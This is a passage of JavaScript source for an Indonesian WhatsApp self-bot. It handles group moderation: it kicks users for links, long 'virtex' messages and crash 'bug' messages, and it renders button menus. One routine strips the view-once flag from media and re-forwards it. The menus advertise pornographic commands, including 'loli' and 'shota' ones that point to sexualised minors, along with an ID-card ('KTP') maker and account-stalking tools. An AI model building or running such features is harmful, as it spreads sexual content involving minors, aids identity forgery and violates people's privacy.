                  if (isAfk(mek.key.remoteJid)) return;
                  addafk(mek.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  client.sendMessage(
                    mek.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
      let authorname = client.contacts[from] != undefined ? client.contacts[from].vname || client.contacts[from].notify : undefined	
if (authorname != undefined) { } else { authorname = pushname }	
			
function addMetadata(packname, author) {	
if (!packname) packname = 'Xtreambot'; if (!author) author = 'idoganz';	
author = author.replace(/[^a-zA-Z0-9]/g, '');	
let name = `${author}_${packname}`
if (fs.existsSync(`./database/stickers/${name}.exif`)) return `./database/stickers/${name}.exif`
const json = {	
	"sticker-pack-name": idoganz,
	"sticker-pack-publisher": bot,
}
const littleEndian = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])	
const bytes = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]	

let len = JSON.stringify(json).length	
let last	

if (len > 256) {	
len = len - 256	
bytes.unshift(0x01)	
} else {	
bytes.unshift(0x00)	
}	

if (len < 16) {	
last = len.toString(16)	
last = "0" + len	
} else {	
last = len.toString(16)	
}	

const buf2 = Buffer.from(last, "hex")	
const buf3 = Buffer.from(bytes)	
const buf4 = Buffer.from(JSON.stringify(json))	
const buffer = Buffer.concat([littleEndian, buf2, buf3, buf4])	

fs.writeFile(`./database/stickers/${name}.exif`, buffer, (err) => {	return `./database/stickers/${name}.exif`	
})	
}
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283152753417@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
        
    const sendKontak = (from, nomor, nama, org = "") => {
      const vcard =
        "BEGIN:VCARD\n" +
        "VERSION:3.0\n" +
        "FN:" +
        nama +
        "\n" +
        "ORG:" +
        org +
        "\n" +
        "TEL;type=CELL;type=VOICE;waid=" +
        nomor +
        ":+" +
        nomor +
        "\n" +
        "END:VCARD";
      client.sendMessage(
        from,
        { displayname: nama, vcard: vcard },
        MessageType.contact,
        { quoted: mek }
      );
    };
    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !mek.key.fromMe) {
      if (budy.includes("://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! 𝙻𝚄 𝙶𝚄𝙰 𝙺𝙸𝙲𝙺 𝙰𝙽𝙹𝙸𝙽𝙶[!]");
        client.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...mek };
      msg.mek = mek.message.viewOnceMessage.message;
      msg.mek[Object.keys(msg.mek)[0]].viewOnce = false;
      client.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !mek.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        client.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        client.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !mek.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        client.groupRemove(from, [sender]);
      }
    }
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

      await client.setStatus(`(AKTIF : ${uptime} | (TIME : ${time})`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
	 
  
    if (!mek.key.fromMe && banChats === true) return;
// Auto Read
client.chatRead(from, "read")
        
if ((Object.keys(mek.message)[0] === 'ephemeralMessage' && JSON.stringify(mek.message).includes('EPHEMERAL_SETTING')) && mek.message.ephemeralMessage.message.protocolMessage.type === 3) {
if (bugc === false) return
if (mek.key.fromMe) return
nums = mek.participant
longkapnye = "\n".repeat(420)
tekuss = `${longkapnye}\`\`\`B U G  G C  T E R D E T E K S I\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by bot_\n*Jangan maen bug lah*`
client.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`Gua mau kick tapi gua bukan admin 🤙`) })
client.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
client.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}

if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
if (antitrol === false) return
if (mek.key.fromMe) return
reply('Fake Troli Detected \n\n' + require('util').format(m.key))
await client.modifyChat(m.chat, 'delete', {
includeStarred: false
})
}
		
if (autovn) {
	if (autovn === false) return
await client.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await client.updatePresence(from, Presence.composing)
}
		
    switch (command) {
      case "3633":
      case "3622":
      case "3633":
        var menu = `${ucapanWaktu} @${senderr.split("@")[0]}
├──「  ◩ 𝗦𝗲𝗹𝗳-𝗕𝗼𝘁  」
├► 𝙹𝚊𝚖 : ${jam}
├► 𝙷𝚊𝚛𝚒 : ${week} ${weton}
├► 𝚃𝚊𝚗𝚐𝚐𝚊𝚕 : ${date}
├   ${readmore}
├► 𝙽𝚊𝚖𝚊 : ${namabot}
├► 𝚆𝚑𝚊𝚝𝚜𝙰𝚙𝚙 : wa.me/${nobot}
├► 𝚁𝚎𝚌𝚘𝚍𝚎 : ${namaowner}l
├
├──◪ ⧉ ꪶ𖣂ꫂ IDO ボ GANZ 〽⧉❋ཻུ۪۪⸙
├https://wa.me/6285609217332
├ 𝙸𝙽𝙵𝙾 𝙱𝙾𝚃
├• 𝙿𝚛𝚎𝚏𝚒𝚡 : 「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」
├• 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime(process.uptime())}
├• 𝙷𝚒𝚝 𝚃𝚘𝚍𝚊𝚢 : ${hit_today.length} Hit
├• 𝚃𝚘𝚝𝚊𝚕 𝙷𝚒𝚝 : ${totalhit} Hit
├• 𝚃𝚘𝚝𝚊𝚕 𝙲𝚑𝚊𝚝 : ${totalchat.length} Chat
├「  ◩ 𝗦𝗲𝗹𝗳-𝗕𝗼𝘁  」 ❋ཻུ۪۪⸙
├⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕`
;        
        sendButImage(from, menu, "recode by @xtream-bot", thumb, [
          {
            buttonId: `${prefix}3634`,
            buttonText: {
              displayText: `💾 𝑨𝑳𝑳𝑴𝑬𝑵𝑼`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: `👤 𝑪𝑶𝑵𝑻𝑨𝑪𝑻 𝑶𝑾𝑵𝑬𝑹`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: `🎗 𝑴𝑬𝑵𝑼️`,
            },
            type: 1,
          },
        ]);

        break;       
               case 'groupmenu':
        case 'menugroup':                                   
               menu =`ꪶ𖣂ꫂXTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}ownermenu`, buttonText: {displayText: 'OWNER MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}add 
🌹 ${prefix}kick 
🌹 ${prefix}promote 
🌹 ${prefix}kickall 
🌹 ${prefix}demote 
🌹 ${prefix}leave 
🌹 ${prefix}tagall 
🌹 ${prefix}grup 
🌹 ${prefix}setppgrup 
🌹 ${prefix}antilink 
🌹 ${prefix}setdesc
🌹 ${prefix}linkgroup 
🌹 ${prefix}listonline 
🌹 ${prefix}mute 
🌹 ${prefix}antiviewonce 
🌹 ${prefix}antivirtex 
🌹 ${prefix}kickarea 
🌹 ${prefix}autoread 
🌹 ${prefix}radd 
🌹 ${prefix}getbio 
🌹 ${prefix}getname 
🌹 ${prefix}reminder 
🌹 ${prefix}sider 
🌹 ${prefix}ownergroup
🌹 ${prefix}edotensei 
🌹 ${prefix}groupinfo
🌹 ${prefix}closegc 
🌹 ${prefix}opengc 
🌹 ${prefix}tutuptime 
🌹 ${prefix}closetime 
🌹 ${prefix}antibuggc
🌹 ${prefix}revoke

𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ] 
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ]
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕


 ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break
        
        case 'ownermenu':
        case  'menuowner':                          
           menu =`ꪶ𖣂ꫂXTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}wibumenu`, buttonText: {displayText: 'WIBU MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}bc teks
🌹 ${prefix}term
🌹 ${prefix}join link gc
🌹 ${prefix}eval
🌹 ${prefix}reset
🌹 ${prefix}clearall
🌹 ${prefix}getquoted
🌹 ${prefix}premium add @tag|nomor
🌹 ${prefix}shutdown
🌹 ${prefix}addupdate fiturnya
🌹 ${prefix}leaveall
🌹 ${prefix}sewa _add/del waktunya_
🌹 ${prefix}exif _nama|author_
🌹 ${prefix}premium _del @tag|nomor_
🌹 ${prefix}pin
🌹 ${prefix}unpin
🌹 ${prefix}delete/del
🌹 ${prefix}delthischat
🌹 ${prefix}autoread
🌹 ${prefix}archive
🌹 ${prefix}unarchiveall
🌹 ${prefix}setnameido
🌹 ${prefix}setowner
🌹 ${prefix}restart
🌹 ${prefix}demoteall
🌹 ${prefix}promoteall
🌹 ${prefix}leave
🌹 ${prefix}leaveall
🌹 ${prefix}setnameido
🌹 ${prefix}tagall
🌹 ${prefix}setbio
🌹 ${prefix}offline
🌹 ${prefix}online
🌹 ${prefix}bc
🌹 ${prefix}bcgc
🌹 ${prefix}setprefix
🌹 ${prefix}public
🌹 ${prefix}self

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ]
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕


 ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break;        
       case 'wibumenu':
        case  'menuwibu':
     menu =`ꪶ𖣂ꫂXTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}downloadmenu`, buttonText: {displayText: 'DOWNLOAD MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}loli
🌹 ${prefix}loli2
🌹 ${prefix}hentai
🌹 ${prefix}hentai2
🌹 ${prefix}waifu
🌹 ${prefix}neko
🌹 ${prefix}husbu
🌹 ${prefix}milf
🌹 ${prefix}awoo
🌹 ${prefix}blowjob
🌹 ${prefix}smug
🌹 ${prefix}neko4
🌹 ${prefix}waifu4
🌹 ${prefix}kick2
🌹 ${prefix}randomneko
🌹 ${prefix}randomloli
🌹 ${prefix}randommilf
🌹 ${prefix}randomkiss
🌹 ${prefix}randomhusbu
🌹 ${prefix}randomwaifu
🌹 ${prefix}randomshota
🌹 ${prefix}nsfwneko
🌹 ${prefix}nsfwpussy
🌹 ${prefix}nsfwass
🌹 ${prefix}nsfwbdsm
🌹 ${prefix}nsfwcum
🌹 ${prefix}nsfwfemdom
🌹 ${prefix}nsfwblowjob
🌹 ${prefix}nsfwboobjob
🌹 ${prefix}nsfwglasses
🌹 ${prefix}nsfwcreampie
🌹 ${prefix}waifu7
🌹 ${prefix}neko7
🌹 ${prefix}orgy
🌹 ${prefix}jahi
🌹 ${prefix}gangbang
🌹 ${prefix}bdsm
🌹 ${prefix}foot
🌹 ${prefix}pussy
🌹 ${prefix}hentaigif
🌹 ${prefix}ero
🌹 ${prefix}panties
🌹 ${prefix}cum2
🌹 ${prefix}loli2
🌹 ${prefix}blowjob2
🌹 ${prefix}cry
🌹 ${prefix}kill
🌹 ${prefix}bonk
🌹 ${prefix}bully🌹 ${prefix}chiisaihentai
🌹 ${prefix}trapp
🌹 ${prefix}blowjobb
🌹 ${prefix}yaoii
🌹 ${prefix}ecchii
🌹 ${prefix}ahegaoo
🌹 ${prefix}hololewd
🌹 ${prefix}sideoppai
🌹 ${prefix}animefeets
🌹 ${prefix}animebooty
🌹 ${prefix}animethighss
🌹 ${prefix}hentaiparadise
🌹 ${prefix}animearmpits
🌹 ${prefix}hentaifemdom
🌹 ${prefix}lewdanimegirls
🌹 ${prefix}biganimetiddies
🌹 ${prefix}animebellybutton
🌹 ${prefix}hentai4everyone
🌹 ${prefix}bj
🌹 ${prefix}eroo
🌹 ${prefix}cumm
🌹 ${prefix}feett
🌹 ${prefix}yurii
🌹 ${prefix}trapp
🌹 ${prefix}lewd
🌹 ${prefix}feed
🌹 ${prefix}eron
🌹 ${prefix}solo
🌹 ${prefix}gasm
🌹 ${prefix}poke
🌹 ${prefix}anall
🌹 ${prefix}holo
🌹 ${prefix}tits
🌹 ${prefix}kuni
🌹 ${prefix}kisss
🌹 ${prefix}erokk
🌹 ${prefix}smugg
🌹 ${prefix}bakaa
🌹 ${prefix}solog
🌹 ${prefix}feetg
🌹 ${prefix}lewdk
🌹 ${prefix}waifuu
🌹 ${prefix}pussyy
🌹 ${prefix}femdom
🌹 ${prefix}cuddle
🌹 ${prefix}hentai
🌹 ${prefix}eroyuri
🌹 ${prefix}cum_jpg
🌹 ${prefix}blowjob2
🌹 ${prefix}erofeet
🌹 ${prefix}holoero
🌹 ${prefix}classic
🌹 ${prefix}erokemo
🌹 ${prefix}fox_girl
🌹 ${prefix}futanari
🌹 ${prefix}lewdkemo
🌹 ${prefix}wallpaper
🌹 ${prefix}pussy_jpg
🌹 ${prefix}kemonomimi
🌹 ${prefix}nsfw_avatar2


 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ]
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

  ꪶ𖣂ꫂ IDO ボ GANZ 〽@idoganz`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break;
               case 'downloadmenu':
        case  'menudownload':
         menu =`ꪶ𖣂ꫂXTREAM BOTぽ 以 `

               buttons =  [
    {buttonId: `${prefix}othermenu`, buttonText: {displayText: 'OTHER MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
   
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}facebook
🌹 ${prefix}nthentaipdf
🌹 ${prefix}tiktok3
🌹 ${prefix}twitter
🌹 ${prefix}ttwm
🌹 ${prefix}ttnowm
🌹 ${prefix}stalktiktok2
🌹 ${prefix}tiktokstalk
🌹 ${prefix}tiktok2
🌹 ${prefix}igdl
🌹 ${prefix}igstalk
🌹 ${prefix}mlstalk
🌹 ${prefix}ffstalk
🌹 ${prefix}instagram
🌹 ${prefix}ytmp3
🌹 ${prefix}ytmp4
🌹 ${prefix}stalkgithub
🌹 ${prefix}mediafire
🌹 ${prefix}soundcloud
🌹 ${prefix}tikokaudio
🌹 ${prefix}play

 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎: 
®𝐈𝐃𝐎𝐆𝐀𝐍𝐙 [ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ] 
®𝐗𝐭𝐫𝐞𝐚𝐦•𝐛𝐨𝐭 [ 𝐁𝐎𝐓 ] 
®𝐋𝐚𝐰𝐚𝐧𝐏𝐚𝐬𝐮𝐤𝐚𝐧𝐆𝐡𝐨𝐬𝐭 [ 𝐓𝐞𝐚𝐦 ] 
®𝑿𝒇𝒂𝒖𝒛𝒂𝒏 [ 𝑭𝑹𝑰𝑬𝑵𝑫𝑺 ]
®𝐉𝐮𝐚𝐧𝐋𝐮𝐜𝐢𝐯𝐞𝐫 [ 𝐌𝐚𝐬𝐭𝐚𝐡 ] 
⌕ ❙❘❙❙❘❙❚❙❘❙❙❚❙❘❙❘❙❚❙❘❙❙❚❙❘❙❙❘❙❚❙❘ ⌕

 ️ꪶ𖣂ꫂ IDO ボ GANZ 〽 @idoganz1`, imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}


               prep = await client.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftroli, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
                          client.relayWAMessage(prep)
               break;
        case 'othermenu':
        case  'menuother':              
         menu =`ꪶ𖣂ꫂXTREAM　B O T ぽ 以 `

               buttons =  [
    {buttonId: `${prefix}gamemenu`, buttonText: {displayText: 'GAME MENU'}, type: 1},
]
               imageMsg = (await client.prepareMessageMedia(fs.readFileSync(`./media/Menu.jpg`), 'imageMessage', { thumbnail:fake, contextInfo:{forwardingScore: 989, isForwarded: true }})).imageMessage

               buttonsMessage = {
               contentText: `${menu}`,
               footerText:  `   
▢ 𝐎𝐰𝐧𝐞𝐫 : 𝐈𝐝𝐨𝐠𝐚𝐧𝐳𝟏
▢ 𝐁𝐨𝐭 :  𝐗𝐭𝐫𝐞𝐚𝐦|𝐛𝐨𝐭
▢ 𝐏𝐫𝐞𝐟𝐢𝐱 :  𝐀𝐥𝐥 𝐏𝐫𝐞𝐟𝐢𝐱 / 𝐧𝐨𝐩𝐫𝐞𝐟
▢ 𝐒𝐄𝐋𝐅 / 𝐏𝐔𝐁𝐋𝐈𝐂
▢ 𝐃𝐨𝐧𝐚𝐬𝐢 : https://saweria.co/idoganz1
    
𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
   
🌹 ${prefix}brainly query
🌹 ${prefix}shopee  _product_
🌹 ${prefix}playstore  _query_
🌹 ${prefix}ssweb  _query_
🌹 ${prefix}google  _query_
🌹 ${prefix}image  _query_
🌹 ${prefix}pinterest  _query_
🌹 ${prefix}nulis  _teks_
🌹 ${prefix}iguser  _ussername_
🌹 ${prefix}igstalk  _username_
🌹 ${prefix}githubstalk  _username_
🌹 ${prefix}tiktokstalk  _ussername_
🌹 ${prefix}img2url  _reply foto_
🌹 ${prefix}ytsearch  _query_
🌹 ${prefix}ktpmaker
🌹 ${prefix}foliokanan
🌹 ${prefix}foliokiri
🌹 ${prefix}bukukanan
🌹 ${prefix}bukukiri
🌹 ${prefix}artinama
🌹 ${prefix}artinama1
🌹 ${prefix}artimimpi
🌹 ${prefix}ytgold2
🌹 ${prefix}spatrick
🌹 ${prefix}patrick
🌹 ${prefix}fox
🌹 ${prefix}cat
🌹 ${prefix}dog
🌹 ${prefix}panda
🌹 ${prefix}panda1
